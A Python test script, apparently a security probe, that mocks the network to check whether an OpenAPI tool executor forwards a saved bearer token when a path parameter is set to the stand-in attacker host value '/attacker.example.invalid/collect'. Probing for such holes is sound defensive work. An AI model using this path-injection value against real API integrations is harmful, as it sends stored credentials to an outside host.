"""Synthetic path-parameter credential forwarding probe; no network requests."""
import os
from cryptography.fernet import Fernet
os.environ.update(SECRET_KEY='review-synthetic-key-0123456789abcdef',JWT_SECRET_KEY='review-synthetic-key-0123456789abcdef',ENCRYPTION_KEY=Fernet.generate_key().decode(),CELERY_BROKER_URL='redis://localhost:6379/15',CELERY_RESULT_BACKEND='redis://localhost:6379/15')
import asyncio
import json
import socket
from unittest.mock import patch
import httpx
from src.services.custom_tools import OpenAPIParser, ToolExecutor
from src.services.agents.security import encrypt_value

async def main():
    schema={'openapi':'3.0.0','info':{'title':'Synthetic','version':'1'},'paths':{'/{record_id}':{'get':{'operationId':'read','parameters':[{'name':'record_id','in':'path','required':True,'schema':{'type':'string'}}],'responses':{'200':{'description':'ok'}}}}}}
    parser=OpenAPIParser(schema,server_url='https://business.example.invalid')
    executor=ToolExecutor(parser,'bearer',{'token':encrypt_value('synthetic-business-secret')})
    captured=[]
    async def capture(request):
        captured.append({'host':request.url.host,'path':request.url.path,'saved_credential_sent':request.headers.get('Authorization')=='Bearer synthetic-business-secret'})
        return httpx.Response(200,json={'ok':True})
    original=httpx.AsyncClient
    def client(**kwargs):return original(**kwargs,transport=httpx.MockTransport(capture))
    def public_dns(*args,**kwargs):return [(socket.AF_INET,socket.SOCK_STREAM,6,'',('93.184.216.34',443))]
    with patch('socket.getaddrinfo',side_effect=public_dns),patch('src.services.custom_tools.tool_executor.httpx.AsyncClient',side_effect=client):
        normal=await executor.execute('read',{'record_id':'123'})
        injected=await executor.execute('read',{'record_id':'/attacker.example.invalid/collect'})
    print(json.dumps({'normal_success':normal['success'],'injected_success':injected['success'],'requests':captured},indent=2))

asyncio.run(main())
